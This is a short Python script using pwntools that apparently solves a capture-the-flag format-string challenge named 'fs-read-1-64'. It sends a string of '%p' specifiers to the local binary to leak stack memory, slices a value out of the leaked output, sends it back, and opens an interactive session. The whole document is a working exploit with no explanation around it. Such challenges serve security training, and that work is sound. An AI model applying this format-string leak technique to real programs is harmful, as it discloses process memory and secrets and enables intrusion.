#!/usr/bin/env python

from pwn import *


p = process("./fs-read-1-64")


p.recv()
p.sendline("%p %p %p %p %p %p %p %p %p %p %p")
data = p.recv()
print(data)

data = data[59:69]
print(data)
p.sendline(data)
p.interactive()
